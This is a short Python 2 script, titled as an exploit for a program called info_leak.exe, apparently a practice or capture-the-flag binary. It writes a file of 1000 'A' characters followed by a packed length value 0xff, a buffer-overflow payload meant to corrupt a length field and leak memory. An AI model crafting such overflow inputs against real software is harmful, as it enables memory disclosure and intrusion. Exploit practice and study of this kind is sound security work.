# info_leak.exe Exploit
import struct
print "[+] Creat text file..."
LENGTH = struct.pack('<L',0xff)
DUMMY = "A" * 1000 + LENGTH
PAYLOAD = DUMMY
f = open("test.txt","w")
f.write(PAYLOAD)
f.close()